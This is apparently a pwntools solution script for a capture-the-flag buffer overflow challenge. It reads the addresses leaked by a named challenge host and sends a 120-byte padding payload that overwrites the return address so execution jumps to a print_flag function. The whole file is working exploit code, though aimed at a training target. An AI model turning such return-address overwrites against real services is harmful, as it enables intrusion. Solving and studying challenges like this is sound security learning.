#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "overflow.challenges2.ctf.dscjssstuniv.in"
PORT = 9001

# Connect to challenge
io = remote(HOST, PORT)

# Read leaked addresses
io.recvuntil(b"Buffer address: ")
buffer_addr = int(io.recvline().strip(), 16)

io.recvuntil(b"Secret function address: ")
win_addr = int(io.recvline().strip(), 16)

log.info(f"Buffer address: {hex(buffer_addr)}")
log.info(f"print_flag address: {hex(win_addr)}")

# Offset: buffer + saved RBP
offset = 120

# Payload: overwrite return address with print_flag
payload = b"A" * offset + p64(win_addr)

log.info("Sending payload...")
io.sendline(payload)

print("\n" + "=" * 50)
print(io.recvall(timeout=2).decode(errors="ignore"))
print("=" * 50)

io.close()
